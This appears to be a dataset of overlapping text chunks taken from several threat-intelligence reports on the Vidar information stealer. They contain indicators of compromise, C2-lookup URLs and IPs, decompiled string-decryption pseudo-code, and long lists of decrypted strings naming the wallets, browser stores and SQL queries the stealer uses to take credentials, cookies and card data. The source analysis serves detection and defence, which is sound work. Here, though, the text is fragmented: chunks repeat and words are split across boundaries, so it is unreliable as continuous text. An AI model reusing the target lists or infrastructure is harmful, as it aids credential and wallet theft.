Conclusion The threat actors distributing Vidar malware have demonstrated their ability to social engineer victims into installing Vidar stealer using themes related to the latest popular software applications. As always, users should be cautious when downloading software applications from the Internet and download software only from the official vendor websites. The Zscaler ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers safe.

Zscaler cloud sandbox detection

7/13

Figure 8: Zscaler cloud sandbox detection In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels. Win32.Downloader.Vidar Win64.Downloader.Vidar

Indicators of compromise

Hashes

52c47fdda399b011b163812c46ea94a6

da82d43043c101f25633c258f527c9d5

e9a3562f3851dd2dba27f90b5b2d15c0

6ae17cb76cdf097d4dc4fcccfb5abd8a

Domains

ms



win11[. ]com

ms



win11.midlandscancer[. ]com

win11



serv4[. ]com

win11



serv[. ]com

win11install[. ]com

ms



teams



app[. ]net

URLs for fetching C2 addresses https://t.me/btc20220425 https://ieji.de/@ronxik213 https://koyu.space/@ronxik123 https://t.me/mm20220428"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|dfd327cfed894a38b636a0c3e3255b90
"app[. ]net

URLs for fetching C2 addresses https://t.me/btc20220425 https://ieji.de/@ronxik213 https://koyu.space/@ronxik123 https://t.me/mm20220428

URLs for fetching ISO files files.getsnyper[. ]com/files/msteams/Setup.iso files.getsnyper[. ]com/files/windows11/Setup.iso files.getsnyper[. ]com/files/msteamsww/Setup.iso

Actual C2s

195.201.250.209

107.189.11.124

5.252.178.50

107.189.11.124

Appendix

Decoded Strings

Wallets

Plugins



wallet



.dat

\\Wallets\\

keystore

Ethereum\

\\Ethereum\\

Electrum

\\Electrum\\wallets\\

ElectrumLTC

\\Electrum



LTC\\wallets\\

Exodus

\\Exodus\\

exodus.conf.json

window



state.json

8/13"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|83f892b8118149d6aaa78dbc6c7c2fbb
"Electrum

\\Electrum\\wallets\\

ElectrumLTC

\\Electrum



LTC\\wallets\\

Exodus

\\Exodus\\

exodus.conf.json

window



state.json

8/13

\\Exodus\\exodus.wallet\\ passphrase.json seed.seco info.seco ElectronCash \\ElectronCash\\wallets\\ default_wallet MultiDoge \\MultiDoge\\ multidoge.wallet JAXX \\jaxx\\Local Storage\\ file__0.localstorage Atomic \\atomic\\Local Storage\\leveldb\\ 000003.log CURRENT LOCK LOG MANIFEST-000001 0000* Binance \\Binance\\ app-store.json Coinomi \\Coinomi\\Coinomi\\wallets\\ *.wallet *.config wallet_path SOFTWARE\\monero-project\\monero-core \\Monero\\ SELECT fieldname, value FROM moz_formhistory \\files\\Soft \\files\\Soft\\Authy \\Authy Desktop\\Local Storage\\ \\Authy Desktop\\Local Storage\\*.localstorage \\Opera Stable\\Local State INSERT_KEY_HERE JohnDoe HAL9TH api.faceit.com /core/v1/nicknames/ about Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 C:\\ProgramData\\ .exe :Zone.Identifier [ZoneTransfer] ZoneId=2 Windows ProgramData RECYCLE.BIN Config.Msi System Volume Information msdownld.tmp Recovery Local\\Temp Program Files Recycle.Bin All Users MicrosoftEdge\\Cookies Users\\Public Local\\Packages Local\\NuGet

9/13"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|3db666ee41404e028d602f09cfda93ff
"9/13

Roaming\\WinRAR Local\\Microsoft Microsoft fee_estimates peers mempool banlist governance mncache mnpayments netfulfilled passwords.txt Login Data Cookies Web Data \\files\\Autofill \\files\\Cookies \\files\\CC \\files\\History \\files\\Downloads \\files\\ \\files\\Files hwid os platform profile user cccount fcount telegram ver vaultcli.dll VaultOpenVault VaultCloseVault VaultEnumerateItems VaultGetItem VaultFree SELECT url FROM moz_places %s\\Mozilla\\Firefox\\profiles.ini \\signons.sqlite SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins \\logins.json formSubmitURL usernameField encryptedUsername encryptedPassword guid SELECT host, name, value FROM moz_cookies SELECT origin_url, username_value, password_value FROM logins SELECT name, value FROM autofill SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards SELECT target_path, tab_url from downloads SELECT url, title from urls SELECT HOST_KEY, is_httponly, path, is_secure, (expires_utc/1000000)-11644480800, name, encrypted_value from cookies C:\\Users\\ \\AppData\\Roaming\\FileZilla\\recentservers.xml <Host> <Port> <User> <Pass encoding=\ Soft: FileZilla\n \\AppData\\Roaming\\.purple\\accounts.xml <protocol> <name>

10/13

<password>

Soft: Pidgin\n

\\Thunderbird\\Profiles\\

C:\\Program Files (x86)\\Mozilla Thunderbird

APPDATA

LOCALAPPDATA

Thunderbird

\\files\\Telegram

\\Telegram Desktop\\tdata\\



D877F783D5D3EF8C"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|2c0df2a8914b4730aabc260b21d2772c
"APPDATA

LOCALAPPDATA

Thunderbird

\\files\\Telegram

\\Telegram Desktop\\tdata\\



D877F783D5D3EF8C



\\Telegram Desktop\\tdata\\

key_datas

\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\



map



\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\

firefox.exe

plugin



container.exe

update_notifier.exe

Mozilla Firefox

\\Mozilla\\Firefox\\Profiles\\

Pale Moon

\\Moonchild Productions\\Pale Moon\\Profiles\\

Waterfox

\\Waterfox\\Profiles\\

Cyberfox

\\8pecxstudios\\Cyberfox\\Profiles\\

BlackHawk

\\NETGATE Technologies\\BlackHawk\\Profiles\\

IceCat

\\Mozilla\\icecat\\Profiles\\

K



Meleon

\\K



Meleon\\

Google Chrome

\\Google\\Chrome\\User Data\\

Chromium

\\Chromium\\User Data\\

Kometa

\\Kometa\\User Data\\

Amigo

\\Amigo\\User Data\\

Torch

\\Torch\\User Data\\

Orbitum

\\Orbitum\\User Data\\

Comodo Dragon

\\Comodo\\Dragon\\User Data\\

Nichrome

\\Nichrome\\User Data\\

Maxthon5

\\Maxthon5\\Users\\

Sputnik

\\Sputnik\\User Data\\

Epic Privacy Browser

\\Epic Privacy Browser\\User Data\\

Vivaldi

\\Vivaldi\\User Data\\

CocCoc

\\CocCoc\\Browser\\User Data\\

URAN

\\uCozMedia\\Uran\\User Data\\

QIP Surf

\\QIP Surf\\User Data\\

Cent Browser

\\CentBrowser\\User Data\\

11/13

Elements Browser

\\Elements Browser\\User Data\\

TorBro Browser

\\TorBro\\Profile\\

Suhba Browser

\\Suhba\\User Data\\

Mustang Browser

\\Rafotech\\Mustang\\User Data\\

Chedot Browser

\\Chedot\\User Data\\

Brave_Old

\\brave\\

7Star

\\7Star\\7Star\\User Data\\"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|14239ffe69914a259f1736e123d29509
"Mustang Browser

\\Rafotech\\Mustang\\User Data\\

Chedot Browser

\\Chedot\\User Data\\

Brave_Old

\\brave\\

7Star

\\7Star\\7Star\\User Data\\

Microsoft Edge

\\Microsoft\\Edge\\User Data\\

360 Browser

\\360Browser\\Browser\\User Data\\

QQBrowser

\\Tencent\\QQBrowser\\User Data\\

Opera

\\Opera Software\\Opera Stable\\

OperaGX

\\Opera Software\\Opera GX Stable\\

Local State

Cookies

%s_%s.txt

TRUE

FALSE

\\Microsoft\\Windows\\Cookies\\Low\\

Cookies\\IE_Cookies.txt

\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies\\

Cookies\\Edge_Cookies.txt

\\files\\Wallets

%USERPROFILE%

%DESKTOP%

KERNEL32.DLL

LoadLibraryA

GetProcAddress

VirtualAllocExNuma

gdi32.dll

ole32.dll

user32.dll

psapi.dll

BCRYPT.DLL

BCryptCloseAlgorithmProvider

BCryptDestroyKey

BCryptOpenAlgorithmProvider

BCryptSetProperty

BCryptGenerateSymmetricKey

BCryptDecrypt

CRYPT32.DLL

CryptUnprotectData

CryptStringToBinaryA

C:\\ProgramData\\nss3.dll

NSS_Init

NSS_Shutdown

PK11_GetInternalKeySlot

PK11_FreeSlot

PK11_Authenticate

PK11SDR_Decrypt

advapi32.dll

RegOpenKeyExA

RegQueryValueExA

12/13

RegCloseKey

RegOpenKeyExW

RegGetValueW

RegEnumKeyExA

RegGetValueA

GetUserNameA

GetCurrentHwProfileA

wininet.dll

InternetCloseHandle

InternetReadFile

HttpSendRequestA

HttpOpenRequestA

InternetConnectA

InternetOpenA

HttpAddRequestHeadersA

HttpQueryInfoA

InternetSetFilePointer

InternetOpenUrlA

InternetSetOptionA

DeleteUrlCacheEntry"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|0cc9192989be4f62a6924c1b9df8ea8c
"InternetOpenA

HttpAddRequestHeadersA

HttpQueryInfoA

InternetSetFilePointer

InternetOpenUrlA

InternetSetOptionA

DeleteUrlCacheEntry

CreateCompatibleBitmap

SelectObject

BitBlt

DeleteObject

CreateDCA

GetDeviceCaps

CreateCompatibleDC

CoCreateInstance

CoUninitialize

GetDesktopWindow

ReleaseDC

GetKeyboardLayoutList

CharToOemA

GetDC

wsprintfA

EnumDisplayDevicesA

GetSystemMetrics

GetModuleFileNameExA

GetModuleBaseNameA

EnumProcessModules

13/13"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|22cb80d8c17c4049a3c671975e1a11ae
"Microsoft Help Files Disguise Vidar Malware threatpost.com/microsoft-help-files-vidar-malware/179078/

Subscribe to our Threatpost Today newsletter Join thousands of people who receive the latest breaking cybersecurity news every day. The administrator of your personal data will be Threatpost, Inc., 500 Unicorn Park, Woburn, MA 01801. Detailed information on the processing of personal data can be found in the privacy policy. In addition, you will find them in the message confirming the subscription to the newsletter. Twitter Microsoft Word also leveraged in the email campaign, which uses a 22-year-old Office RCE bug. https://t.co/pr5jq08fPx

1/1"|data_input/vidar_reports/entry_23dae9c5-7a1a-481c-9ade-95b267fa86fb.text|6b3b2eee1f944a39b1632d2f1a40f2f2
"[QuickNote] VidarStealer Analysis

kienmanowar.wordpress.com/2022/12/17/quicknote



vidarstealer



analysis/

December 17, 2022

Sample:

Loader:

https://bazaar.abuse.ch/sample/816c4a2117b90dc75d91056ca32a36ffd32d561aa433ee3f97

126ba490e6d60a/

Unpacked: 7bd942857a29e7f2931da2bd8fa1d118

Decrypt strings Here is the the pseudo-code of the function that decodes the strings:

1/20

_BYTE *__usercall vdr_decrypt_strings@<eax>(uint32_t len@<ecx>, char *xor_key, const char *encStr) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-""+"" TO EXPAND] cnt = 0x208; v5 = Destination; do { *v5 = 0; v5 = (v5 + 1); --cnt; } while ( cnt ); wcscat(Destination, L""Nor again is there anyone who loves or pursues or desires to obtain pain of itself, because it is pain""); wcslen(Destination); wcslen(Destination); wcslen(Destination); wcslen(Destination); decStr = LocalAlloc(0x40u, len + 1); wcslen(Destination); wcslen(Destination); wcslen(Destination); wcslen(Destination); decStr[len] = 0; wcslen(Destination); wcslen(Destination); wcslen(Destination); wcslen(Destination); for ( i = 0; i < len; ++i ) { wcslen(Destination); wcslen(Destination); decStr[i] = xor_key[i] ^ encStr[i % strlen(encStr)]; <-- xor loop wcslen(Destination); wcslen(Destination); } wcslen(Destination); wcslen(Destination); memset(Destination, 0, sizeof(Destination)); return decStr; }

List of all decoded strings:

2/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|3ce53332cbd54abead4593b2d23907d9
"[*] Target function found at 0x404158 [+] Decrypted string: HAL9TH at 0x401136 [+] Decrypted string: JohnDoe at 0x40114d [+] Decrypted string: LoadLibraryA at 0x401164 [+] Decrypted string: lstrcatA at 0x40117b [+] Decrypted string: GetProcAddress at 0x401192 [+] Decrypted string: Sleep at 0x4011a9 [+] Decrypted string: GetSystemTime at 0x4011c0 [+] Decrypted string: ExitProcess at 0x4011d7 [+] Decrypted string: GetCurrentProcess at 0x4011ee [+] Decrypted string: VirtualAllocExNuma at 0x401205 [+] Decrypted string: VirtualAlloc at 0x40121c [+] Decrypted string: VirtualFree at 0x401233 [+] Decrypted string: lstrcmpiW at 0x40124a [+] Decrypted string: LocalAlloc at 0x401261 [+] Decrypted string: GetComputerNameA at 0x401278 [+] Decrypted string: advapi32.dll at 0x40128f [+] Decrypted string: GetUserNameA at 0x4012a6 [+] Decrypted string: kernel32.dll at 0x4012bd [+] Decrypted string: Wallets at 0x4012dc [+] Decrypted string: Plugins at 0x4012f2 [+] Decrypted string: keystore at 0x40130b [+] Decrypted string: Ethereum"" at 0x401322 [+] Decrypted string: \Ethereum\ at 0x401339 [+] Decrypted string: Electrum at 0x40134f [+] Decrypted string: \Electrum\wallets\ at 0x401366 [+] Decrypted string: ElectrumLTC at 0x40137f [+] Decrypted string: \Electrum-LTC\wallets\ at 0x401396 [+] Decrypted string: Exodus at 0x4013ad [+] Decrypted string: \Exodus\ at 0x4013c3 [+] Decrypted string: exodus.conf.json at 0x4013da [+] Decrypted string: window-state.json at 0x4013f1 [+] Decrypted string:"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|44161e3a1a784c05b911caf3fea1768e
\Exodus\ at 0x4013c3 [+] Decrypted string: exodus.conf.json at 0x4013da [+] Decrypted string: window-state.json at 0x4013f1 [+] Decrypted string: \Ex|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|4b348f19d4a94507b5a2615cbd1fb63a
"odus\exodus.wallet\ at 0x401408 [+] Decrypted string: passphrase.json at 0x40141f [+] Decrypted string: seed.seco at 0x401436 [+] Decrypted string: info.seco at 0x40144d [+] Decrypted string: ElectronCash at 0x401464 [+] Decrypted string: \ElectronCash\wallets\ at 0x40147b [+] Decrypted string: default_wallet at 0x401492 [+] Decrypted string: MultiDoge at 0x4014a9 [+] Decrypted string: \MultiDoge\ at 0x4014bf [+] Decrypted string: multidoge.wallet at 0x4014d6 [+] Decrypted string: Jaxx_Desktop_Old at 0x4014ed [+] Decrypted string: \jaxx\Local Storage\ at 0x401504 [+] Decrypted string: file__0.localstorage at 0x40151b [+] Decrypted string: Atomic at 0x401532 [+] Decrypted string: \atomic\Local Storage\leveldb\ at 0x401549 [+] Decrypted string: *.log at 0x401560 [+] Decrypted string: CURRENT at 0x401576 [+] Decrypted string: LOCK at 0x40158d [+] Decrypted string: LOG at 0x4015a4 [+] Decrypted string: MANIFEST-000001 at 0x4015bb

3/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|2a774f1f432a4cf284da1f27108cab98
[+] Decrypted string: 0000* at 0x4015d2 [+] Decrypted string: Binance at 0x4015e8 [+] Decrypted string: \Binance\ at 0x4015ff [+] Decrypted string: app-store.json at 0x401616 [+] Decrypted string: Coinomi at 0x40162c [+] Decrypted string: \Coinomi\Coinomi\wallets\ at 0x401643 [+] Decrypted string: *.wallet at 0x401659 [+] Decrypted string: *.config at 0x40166f [+] Decrypted string: wallet_path at 0x401685 [+] Decrypted string: SOFTWARE\monero-project\monero-core at 0x40169c [+] Decrypted string: \Monero\ at 0x4016b2 [+] Decrypted string: C:\ProgramData\ at 0x4016c9 [+] Decrypted string: .exe at 0x4016e0 [+] Decrypted string: RECYCLE.BIN at 0x4016f6 [+] Decrypted string: Config.Msi at 0x40170d [+] Decrypted string: System Volume Information at 0x401724 [+] Decrypted string: msdownld.tmp at 0x40173b [+] Decrypted string: Recovery at 0x401751 [+] Decrypted string: Local\Temp at 0x401768 [+] Decrypted string: Recycle.Bin at 0x40177e [+] Decrypted string: MicrosoftEdge\Cookies at 0x401795 [+] Decrypted string: Local\Packages at 0x4017ac [+] Decrypted string: Local\NuGet at 0x4017c2 [+] Decrypted string: Roaming\WinRAR at 0x4017d9 [+] Decrypted string: Local\Microsoft at 0x4017f0 [+] Decrypted string: fee_estimates at 0x401809 [+] Decrypted string: peers at 0x401820 [+] Decrypted string: mempool at 0x401836 [+] Decrypted string: banlist at 0x40184c [+] Decrypted string: governance at 0x401863 [+] Decrypted string: mncache at 0x401879 [+] Decrypted string: mnpayments at 0x401890|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|e73573af45b44c91badab63c9b9621a0
at 0x40184c [+] Decrypted string: governance at 0x401863 [+] Decrypted string: mncache at 0x401879 [+] Decrypted string: mnpayments at 0x401890 [+]|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|5fb13dd425af484493768778b5fa8227
"Decrypted string: netfulfilled at 0x4018a7 [+] Decrypted string: Login Data at 0x4018be [+] Decrypted string: Cookies at 0x4018d4 [+] Decrypted string: Web Data at 0x4018eb [+] Decrypted string: logins.json at 0x401901 [+] Decrypted string: formSubmitURL at 0x401917 [+] Decrypted string: usernameField at 0x40192d [+] Decrypted string: encryptedUsername at 0x401944 [+] Decrypted string: encryptedPassword at 0x40195b [+] Decrypted string: guid at 0x401972 [+] Decrypted string: SELECT origin_url, username_value, password_value FROM logins at 0x401989 [+] Decrypted string: SELECT name, value FROM autofill at 0x4019a2 [+] Decrypted string: SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards at 0x4019b9 [+] Decrypted string: SELECT target_path, tab_url from downloads at 0x4019d0 [+] Decrypted string: SELECT url FROM urls at 0x4019e7 [+] Decrypted string: SELECT HOST_KEY, is_httponly, path, is_secure, (expires_utc/1000000)-11644480800, name, encrypted_value from cookies at 0x4019fe [+] Decrypted string: \AppData\Roaming\FileZilla\recentservers.xml at 0x401a15

4/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|41892c5af5bf48dda490e75919bda7cd
"[+] Decrypted string: <Host> at 0x401a2c [+] Decrypted string: <Port> at 0x401a43 [+] Decrypted string: <User> at 0x401a5a [+] Decrypted string: <Pass encoding=""base64""> at 0x401a71 [+] Decrypted string: Soft: FileZilla at 0x401a88 [+] Decrypted string: Mozilla Firefox at 0x401a9f [+] Decrypted string: \Mozilla\Firefox\Profiles\ at 0x401ab6 [+] Decrypted string: Pale Moon at 0x401acd [+] Decrypted string: \Moonchild Productions\Pale Moon\Profiles\ at 0x401ae4 [+] Decrypted string: Google Chrome at 0x401afa [+] Decrypted string: \Google\Chrome\User Data\ at 0x401b11 [+] Decrypted string: Chromium at 0x401b28 [+] Decrypted string: \Chromium\User Data\ at 0x401b3f [+] Decrypted string: Amigo at 0x401b56 [+] Decrypted string: \Amigo\User Data\ at 0x401b6d [+] Decrypted string: Torch at 0x401b84 [+] Decrypted string: \Torch\User Data\ at 0x401b9b [+] Decrypted string: Comodo Dragon at 0x401bb1 [+] Decrypted string: \Comodo\Dragon\User Data\ at 0x401bc8 [+] Decrypted string: Epic Privacy Browser at 0x401bdf [+] Decrypted string: \Epic Privacy Browser\User Data\ at 0x401bf5 [+] Decrypted string: Vivaldi at 0x401c0c [+] Decrypted string: \Vivaldi\User Data\ at 0x401c23 [+] Decrypted string: CocCoc at 0x401c3a [+] Decrypted string: \CocCoc\Browser\User Data\ at 0x401c51 [+] Decrypted string: Cent Browser at 0x401c68 [+] Decrypted string: \CentBrowser\User Data\ at 0x401c7f [+] Decrypted string: TorBro Browser at 0x401c96 [+] Decrypted string: \TorBro\Profile\ at 0x401cad [+]"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|4f25bad3048247f2b56f7a885b73fa25
string: \CentBrowser\User Data\ at 0x401c7f [+] Decrypted string: TorBro Browser at 0x401c96 [+] Decrypted string: \TorBro\Profile\ at 0x401cad [+] Decrypted|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|b9367a15beee4cdc933f6788cce0792a
"string: Chedot Browser at 0x401cc4 [+] Decrypted string: \Chedot\User Data\ at 0x401cdb [+] Decrypted string: Brave_Old at 0x401cf2 [+] Decrypted string: \brave\ at 0x401d09 [+] Decrypted string: 7Star at 0x401d20 [+] Decrypted string: \7Star\7Star\User Data\ at 0x401d37 [+] Decrypted string: Microsoft Edge at 0x401d4e [+] Decrypted string: \Microsoft\Edge\User Data\ at 0x401d65 [+] Decrypted string: 360 Browser at 0x401d7b [+] Decrypted string: \360Browser\Browser\User Data\ at 0x401d92 [+] Decrypted string: QQBrowser at 0x401da9 [+] Decrypted string: \Tencent\QQBrowser\User Data\ at 0x401dc0 [+] Decrypted string: Opera at 0x401dd7 [+] Decrypted string: \Opera Software\Opera Stable\ at 0x401dee [+] Decrypted string: OperaGX at 0x401e05 [+] Decrypted string: \Opera Software\Opera GX Stable\ at 0x401e1b [+] Decrypted string: Local State at 0x401e31 [+] Decrypted string: Cookies at 0x401e48 [+] Decrypted string: TRUE at 0x401e5f [+] Decrypted string: FALSE at 0x401e76 [+] Decrypted string: gdi32.dll at 0x401e8d [+] Decrypted string: ole32.dll at 0x401ea4

5/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|75d9e12460ca47d7bf46b7b295181234
[+] Decrypted string: user32.dll at 0x401ebb [+] Decrypted string: psapi.dll at 0x401ed2 [+] Decrypted string: BCRYPT.DLL at 0x401ee9 [+] Decrypted string: BCryptCloseAlgorithmProvider at 0x401f00 [+] Decrypted string: BCryptDestroyKey at 0x401f17 [+] Decrypted string: BCryptOpenAlgorithmProvider at 0x401f2e [+] Decrypted string: BCryptSetProperty at 0x401f45 [+] Decrypted string: BCryptGenerateSymmetricKey at 0x401f5c [+] Decrypted string: BCryptDecrypt at 0x401f72 [+] Decrypted string: CRYPT32.DLL at 0x401f88 [+] Decrypted string: CryptUnprotectData at 0x401f9f [+] Decrypted string: CryptStringToBinaryA at 0x401fb6 [+] Decrypted string: C:\ProgramData\nss3.dll at 0x401fcd [+] Decrypted string: NSS_Init at 0x401fe4 [+] Decrypted string: NSS_Shutdown at 0x401ffb [+] Decrypted string: PK11_GetInternalKeySlot at 0x402012 [+] Decrypted string: PK11_FreeSlot at 0x402028 [+] Decrypted string: PK11_Authenticate at 0x40203f [+] Decrypted string: PK11SDR_Decrypt at 0x402056 [+] Decrypted string: RegOpenKeyExA at 0x40206c [+] Decrypted string: RegQueryValueExA at 0x402083 [+] Decrypted string: RegCloseKey at 0x402099 [+] Decrypted string: RegOpenKeyExW at 0x4020af [+] Decrypted string: RegGetValueW at 0x4020c6 [+] Decrypted string: RegEnumKeyExA at 0x4020dc [+] Decrypted string: RegGetValueA at 0x4020f3 [+] Decrypted string: GetCurrentHwProfileA at 0x40210a [+] Decrypted string: wininet.dll at 0x402120 [+] Decrypted string: InternetCloseHandle at 0x402137 [+] Decrypted string:|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|a3342d0a64e84b81a717a2bc6d5d222e
at 0x40210a [+] Decrypted string: wininet.dll at 0x402120 [+] Decrypted string: InternetCloseHandle at 0x402137 [+] Decrypted string: Interne|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|2ab526fc55f9473dbf2c8d38076bd850
"tReadFile at 0x40214e [+] Decrypted string: HttpSendRequestA at 0x402165 [+] Decrypted string: HttpOpenRequestA at 0x40217c [+] Decrypted string: InternetConnectA at 0x402193 [+] Decrypted string: InternetOpenA at 0x4021a9 [+] Decrypted string: HttpAddRequestHeadersA at 0x4021c0 [+] Decrypted string: HttpQueryInfoA at 0x4021d7 [+] Decrypted string: InternetSetFilePointer at 0x4021ee [+] Decrypted string: InternetOpenUrlA at 0x402205 [+] Decrypted string: InternetSetOptionA at 0x40221c [+] Decrypted string: DeleteUrlCacheEntry at 0x402233 [+] Decrypted string: CreateCompatibleBitmap at 0x40224a [+] Decrypted string: SelectObject at 0x402261 [+] Decrypted string: BitBlt at 0x402278 [+] Decrypted string: DeleteObject at 0x40228f [+] Decrypted string: CreateDCA at 0x4022a6 [+] Decrypted string: GetDeviceCaps at 0x4022bc [+] Decrypted string: CreateCompatibleDC at 0x4022d3 [+] Decrypted string: CoCreateInstance at 0x4022ea [+] Decrypted string: CoUninitialize at 0x402301 [+] Decrypted string: GetDesktopWindow at 0x402318 [+] Decrypted string: ReleaseDC at 0x40232f [+] Decrypted string: GetKeyboardLayoutList at 0x402346

6/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|f9e92f5f8a634c01bbaed9a65bc0444a
[+] Decrypted string: CharToOemA at 0x40235d [+] Decrypted string: GetDC at 0x402374 [+] Decrypted string: wsprintfA at 0x40238b [+] Decrypted string: EnumDisplayDevicesA at 0x4023a2 [+] Decrypted string: GetSystemMetrics at 0x4023b9 [+] Decrypted string: GetModuleFileNameExA at 0x4023d0 [+] Decrypted string: GetModuleBaseNameA at 0x4023e7 [+] Decrypted string: EnumProcessModules at 0x4023fe [+] Decrypted string: ibnejdfjmmkpcnlpebklmnkoeoihofec at 0x402414 [+] Decrypted string: TronLink at 0x40242b [+] Decrypted string: nkbihfbeogaeaoehlefnkodbefgpgknn at 0x402441 [+] Decrypted string: MetaMask at 0x402458 [+] Decrypted string: fhbohimaelbohpjbbldcngcnapndodjp at 0x40246e [+] Decrypted string: BinanceChainWallet at 0x402485 [+] Decrypted string: ffnbelfdoeiohenkjibnmadjiehjhajb at 0x40249b [+] Decrypted string: Yoroi at 0x4024b2 [+] Decrypted string: jbdaocneiiinmjbjlgalhcelgbejmnid at 0x4024c8 [+] Decrypted string: NiftyWallet at 0x4024de [+] Decrypted string: afbcbjpbpfadlkmhmclhkeeodmamcflc at 0x4024f4 [+] Decrypted string: MathWallet at 0x40250b [+] Decrypted string: hnfanknocfeofbddgcijnmhnfnkdnaad at 0x402521 [+] Decrypted string: Coinbase at 0x402538 [+] Decrypted string: hpglfhgfnhbgpjdenjgmdgoeiappafln at 0x40254e [+] Decrypted string: Guarda at 0x402565 [+] Decrypted string: blnieiiffboillknjnepogjhkgnoapac at 0x40257b [+] Decrypted string: EQUALWallet at 0x402591 [+] Decrypted string: cjelfplplebdjjenllpjcblmjkfcffne at 0x4025a7 [+] Decrypted string: JaxxLiberty|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|573c2570c53a4c14b97d9de86c931403
[+] Decrypted string: EQUALWallet at 0x402591 [+] Decrypted string: cjelfplplebdjjenllpjcblmjkfcffne at 0x4025a7 [+] Decrypted string: JaxxLiberty a|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|4aaf665be12449ee84bd7f63ed70deda
"t 0x4025bd [+] Decrypted string: fihkakfobkmkjojpchpfgcmhfjnmnfpi at 0x4025d3 [+] Decrypted string: BitAppWallet at 0x4025ea [+] Decrypted string: kncchdigobghenbbaddojjnnaogfppfj at 0x402600 [+] Decrypted string: iWallet at 0x402617 [+] Decrypted string: amkmjjmmflddogmhpjloimipbofnfjih at 0x40262d [+] Decrypted string: Wombat at 0x402644 [+] Decrypted string: nlbmnnijcnlegkjjpcfjclmcfggfefdm at 0x40265a [+] Decrypted string: MewCx at 0x402671 [+] Decrypted string: nanjmdknhkinifnkgdcggcfnhdaammmj at 0x402687 [+] Decrypted string: GuildWallet at 0x40269d [+] Decrypted string: fnjhmkhhmkbjkkabndcnnogagogbneec at 0x4026b3 [+] Decrypted string: RoninWallet at 0x4026c9 [+] Decrypted string: cphhlgmgameodnhkjdmkpanlelnlohao at 0x4026df [+] Decrypted string: NeoLine at 0x4026f6 [+] Decrypted string: nhnkbkgjikgcigadomkphalanndcapjk at 0x40270c [+] Decrypted string: CloverWallet at 0x402723 [+] Decrypted string: kpfopkelmapcoipemfendmdcghnegimn at 0x402739 [+] Decrypted string: LiqualityWallet at 0x402750 [+] Decrypted string: aiifbnbfobpmeekipheeijimdpnlpgpp at 0x402766 [+] Decrypted string: Terra_Station at 0x40277c [+] Decrypted string: dmkamcknogkgcdfhhbddcghachkejeap at 0x402792 [+] Decrypted string: Keplr at 0x4027a9 [+] Decrypted string: fhmfendgdocmcbmfikdcogofphimnkno at 0x4027bf [+] Decrypted string: Sollet at 0x4027d6

7/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|edcf8b73f8534fb69591c1419190d80a
[+] Decrypted string: cnmamaachppnkjgnildpdmkaakejnhae at 0x4027ec [+] Decrypted string: AuroWallet at 0x402803 [+] Decrypted string: jojhfeoedkpkglbfimdfabpdfjaoolaf at 0x402819 [+] Decrypted string: PolymeshWallet at 0x402830 [+] Decrypted string: flpiciilemghbmfalicajoolhkkenfel at 0x402846 [+] Decrypted string: ICONex at 0x40285d [+] Decrypted string: fnnegphlobjdpkhecapkijjdkgcjhkib at 0x402873 [+] Decrypted string: Harmony at 0x40288a [+] Decrypted string: aeachknmefphepccionboohckonoeemg at 0x4028a0 [+] Decrypted string: Coin98 at 0x4028b7 [+] Decrypted string: cgeeodpfagjceefieflmdfphplkenlfk at 0x4028cd [+] Decrypted string: EVER Wallet at 0x4028e3 [+] Decrypted string: pdadjkfkgcafgbceimcpbkalnfnepbnk at 0x4028f9 [+] Decrypted string: KardiaChain at 0x40290f [+] Decrypted string: imloifkgjagghnncjkhggdhalmcnfklk at 0x402925 [+] Decrypted string: Trezor Password Manager at 0x40293c [+] Decrypted string: acmacodkjbdgmoleebolmdjonilkdbch at 0x402952 [+] Decrypted string: Rabby at 0x402969 [+] Decrypted string: bfnaelmomeimhlpmgjnjophhpkkoljpa at 0x40297f [+] Decrypted string: Phantom at 0x402996 [+] Decrypted string: ejbalbakoplchlghecdalmeeeajnimhm at 0x4029ac [+] Decrypted string: 